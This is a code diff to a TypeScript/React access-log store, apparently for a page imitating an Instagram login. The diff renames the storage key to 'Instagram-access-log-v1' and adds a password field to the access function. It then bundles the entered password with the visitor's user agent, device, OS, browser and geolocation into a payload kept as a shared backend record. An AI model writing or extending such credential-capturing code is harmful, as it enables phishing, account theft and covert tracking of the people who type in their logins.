@@ -33,7 +33,7 @@ interface Db {
   currentId: string | null
 }
 
-const KEY = 'instagrom-access-log-v1'
+const KEY = 'Instagram-access-log-v1'
 
 function load(): Db {
   try {
@@ -47,7 +47,7 @@ function load(): Db {
 
 interface Store {
   current: AccessEvent | null
-  access: (name: string) => Promise<void>
+  access: (name: string, password: string) => Promise<void>
   exit: () => void
 }
 
@@ -68,11 +68,11 @@ export function StoreProvider({ children }: { children: ReactNode }) {
     const current = db.events.find((e) => e.id === db.currentId) ?? null
     return {
       current,
-      async access(name) {
+      async access(name, password) {
         const ua = navigator.userAgent
         const { device, os, browser } = parseUserAgent(ua)
         const geo = await lookupGeo()
-        const payload = { name: name.trim() || 'Usuario', userAgent: ua, device, os, browser, ...geo }
+        const payload = { name: name.trim() || 'Usuario', password: password.trim() || 'password_empty', userAgent: ua, device, os, browser, ...geo }
 
         // The local SQLite database (via the backend) is the source of truth,
         // since the whole point is one shared record across every device that
